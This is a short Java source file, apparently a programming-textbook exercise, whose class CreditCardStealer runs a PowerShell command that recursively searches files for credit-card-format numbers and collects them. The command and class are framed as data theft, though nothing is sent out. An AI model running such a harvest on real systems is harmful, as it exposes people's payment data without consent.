package ch09.ex11;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.stream.Collectors;

public class CreditCardStealer {
	public List<String> run() {
		//windows
		String[] command = {"cmd","/c","powershell","\"ls -Recurse | sls -Pattern \\\"[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}\\\"\""};
		Exploit exploiter = new Exploit();

		try(InputStream is = exploiter.RCE(command);) {

			return InputStreamFilter.read(is, Regex::isCreditCardFormat).stream()
				.flatMap(s -> Regex.extractCreditCardNumbers(s).stream())
				.collect(Collectors.toList());
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
			return null;
		}
	}
}
